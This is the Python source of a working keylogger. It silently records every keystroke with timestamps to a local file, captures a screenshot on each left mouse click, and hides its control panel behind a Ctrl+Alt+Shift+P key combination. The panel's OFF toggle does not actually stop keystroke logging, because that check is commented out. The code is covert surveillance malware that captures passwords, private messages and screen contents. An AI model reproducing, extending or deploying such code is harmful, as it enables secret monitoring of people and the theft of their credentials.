import tkinter as tk
import pynput
from pynput.mouse import Listener as MouseListener
from pynput.mouse import Button as MouseButton
from pynput.keyboard import Key, KeyCode, Listener
import time
from datetime import datetime as date
from PIL import ImageGrab
import os
import glob
import re
from threading import Thread


MINUTES_IN_YEAR = 525949.2
MINUTES_IN_MONTH = 43829.1
MINUTES_IN_DAY = 1440
MINUTES_IN_HOUR = 60

logging = True


class Application(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        self.master = master
        self.grid()
        self.create_widgets()

    def create_widgets(self):
        global logging
        self.on_off_button = tk.Button(self)
        if logging:
            self.configure(bg='green')
            self.on_off_button['text'] = 'ON'
        else:
            self.configure(bg='red')
            self.on_off_button['text'] = 'OFF'
        self.on_off_button['width'] = 15
        self.on_off_button['height'] = 2
        self.on_off_button["command"] = self.toggle_logging
        self.on_off_button.grid(row=0, columnspan=3, pady=20)

        self.older_than_label = tk.Label(self)
        self.older_than_label["text"] = "Delete screenshots older than:"
        self.older_than_label.grid(row=1, column=0)

        self.days_entry = tk.Entry(self, width=4)
        self.days_entry.grid(row=1, column=1)

        self.days_label = tk.Label(self)
        self.days_label["text"] = "days"
        self.days_label.grid(row=1, column=2)

        self.delete_button = tk.Button(self)
        self.delete_button["text"] = "Delete files"
        self.delete_button["command"] = self.delete
        self.delete_button.grid(row=2, columnspan=3, pady=20)

        self.days_label = tk.Label(self)
        self.days_label["text"] = f""
        self.days_label.grid(row=3, columnspan=3, pady=10)

        self.quit = tk.Button(self, text="QUIT", fg="red",
                              command=self.master.destroy)
        self.quit.grid(columnspan=3)

    def delete(self):
        days = self.days_entry.get()
        if days.isdigit():
            self.remove_screenshots(int(days))

    def remove_screenshots(self, older_than=7):
        # Extract time from screenshot (with regex) -->
        regex = r'(?P<year>\d{4})-(?P<month>\d{2})-(?P<day>\d{2})=(?P<hour>\d{2})_(?P<minute>\d{2})'
        number_of_deleted_screenshots = 0

        f = glob.glob('Images/*.jpg')
        files = [c_file for c_file in f]
        for current_file in files:
            current_file_filtered = current_file.replace("Images\\", "")
            file_name = re.match(regex, current_file_filtered)

            # file_time
            year = int(file_name.group('year'))
            month = int(file_name.group('month'))
            day = int(file_name.group('day'))
            hour = int(file_name.group('hour'))
            minute = int(file_name.group('minute'))

            # current_time
            current_year = int(date.now().year)
            current_month = int(date.now().month)
            current_day = int(date.now().day)
            current_hour = int(date.now().hour)
            current_minute = int(date.now().minute)

            #  difference
            year_dif = (current_year - year) * MINUTES_IN_YEAR
            month_dif = (current_month - month) * MINUTES_IN_MONTH
            day_dif = (current_day - day) * MINUTES_IN_DAY
            hour_dif = (current_hour - hour) * MINUTES_IN_HOUR
            minute_dif = (current_minute - minute)

            total_dif_in_minutes = year_dif + month_dif + day_dif + hour_dif + minute_dif
            total_dif_in_days = total_dif_in_minutes / MINUTES_IN_DAY

            if total_dif_in_days >= int(older_than):
                os.remove(current_file)
                number_of_deleted_screenshots += 1
            else:
                break
        self.days_label["text"] = f"{number_of_deleted_screenshots} screenshots successfully deleted!"

    def toggle_logging(self):
        global logging
        print(logging)
        logging = not logging
        if logging:
            self.configure(bg='green')
            self.on_off_button['text'] = 'ON'
        else:
            self.configure(bg='red')
            self.on_off_button['text'] = 'OFF'


class Keylogger():
    def __init__(self):
        self.initial()

    def initial(self):
        self.current_time = time.time()
        self.current_combination = set()
        self.COMBINATION = {KeyCode(vk=80), Key.alt_l, Key.shift_l, Key.ctrl_l}
        with open('log.txt', "a") as f:
            f.write('\n' + str(date.now()) + '-->')

    def start_logging(self):
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            with pynput.mouse.Listener(on_click=self.on_click) as listener:
                listener.join()

    def on_press(self, key):
        self.write_file(key)

    def on_release(self, key):
        try:
            self.current_combination.remove(key)
        except KeyError:
            pass

    def write_file(self, key):
        with open('log.txt', "a") as f:
            self.check_combination(key)
            # if logging:
            k = self.get_key_ready_for_print(key)
            if self.current_time + 59.9 <= time.time():
                self.log_time(f)
            f.write(k)

    def get_key_ready_for_print(self, key):

        vk = getattr(key, 'vk', None)
        k = str(key)

        if k == '"\'"':
            k = k.replace('"', "")
        elif k == "'\"'":
            k = k.replace("'", "")
        elif '\\' in k:
            if k[1] == '\\' and k[2] == '\\':
                k = '\\'
            elif vk is not None:
                k = '^' + chr(key.vk)
        elif re.match(r'<\d+>', k) and vk is not None:
            k = chr(key.vk)
        elif vk is not None:
            k = k.replace("'", "")
            k = k.replace('"', "")
        elif vk is None:
            k = k.upper()
            k = k.replace('KEY.', '[')
            k = k + ']'
            if k == '[SPACE]':
                k = ' '
        else:
            pass
        return k

    def check_combination(self, key):
        global logging
        if key in self.COMBINATION:
            self.current_combination.add(key)
            if all(k in self.current_combination for k in self.COMBINATION):
                self.current_combination = set()
                application = Thread(name='Application', target=start_app)
                application.start()

    def log_time(self, f):
        f.write('\n' + str(date.now()) + '-->')
        self.current_time = time.time()

    def take_screenshot(self):
        image_size = (1536, 864)
        snapshot = ImageGrab.grab()
        snapshot = snapshot.resize(image_size)
        screenshot_stamp = str(date.now()).replace(" ", "=")
        screenshot_stamp = screenshot_stamp.replace(":", "_")
        if not os.path.isdir('Images'):
            os.mkdir('Images')
        save_path = f"Images\\{screenshot_stamp}.jpg"
        snapshot.save(save_path)

    def on_click(self, x, y, button, pressed):
        if button == MouseButton.left and pressed and logging:
            self.take_screenshot()


def start_app():
    root = tk.Tk()
    app = Application(master=root)
    app.mainloop()


def start_logging():
    log = Keylogger()
    log.start_logging()


keylogger = Thread(name='Keylogger', target=start_logging)

keylogger.start()
